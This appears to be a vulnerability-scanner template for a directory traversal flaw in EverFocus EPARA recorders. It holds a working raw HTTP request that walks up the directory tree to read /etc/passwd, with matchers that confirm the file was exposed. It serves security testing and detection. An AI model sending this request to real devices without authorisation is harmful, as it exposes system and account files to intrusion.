id: everfocus-epara-directory-traversal

info:
  name: EVERFOCUS EPARA Directory Traversal
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    The EPARA series recorders are vulnerable to a directory traversal attack, allowing unauthorized access to sensitive files on the system.
  tags: directory-traversal

http:
  - raw:
      - |
        GET /../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
